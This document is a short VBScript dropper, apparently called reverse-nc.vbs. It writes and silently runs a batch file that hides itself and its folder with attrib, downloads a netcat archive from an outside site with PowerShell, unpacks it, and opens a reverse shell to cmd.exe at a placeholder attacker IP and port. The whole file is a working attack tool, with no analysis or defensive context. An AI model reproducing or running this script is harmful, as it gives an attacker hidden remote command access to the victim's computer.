on error resume next
dim x, fs, bat
set x = CreateObject("wscript.shell")
set fs = CreateObject("scripting.FileSystemObject")
fs.CreateTextFile ".\nc.bat"
Set bat = fs.OpenTextFile("./nc.bat", 2)
bat.WriteLine"attrib +h reverse-nc.vbs"
bat.WriteLine"attrib +h nc.bat"
bat.WriteLine"mkdir win"
bat.WriteLine"attrib +h win"
bat.WriteLine"cd win"
bat.WriteLine"powershell Invoke-WebRequest https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -OutFile netcat.zip"
bat.WriteLine"powershell Expand-Archive netcat.zip netcat"
bat.WriteLine"cd netcat"
bat.WriteLine"cd netcat-1.11"
bat.WriteLine"nc your ip your port -e c:\Windows\System32\cmd.exe"
bat.Close
x.run chr(34) & ".\nc.bat" & chr(34), 0
set x = Nothing
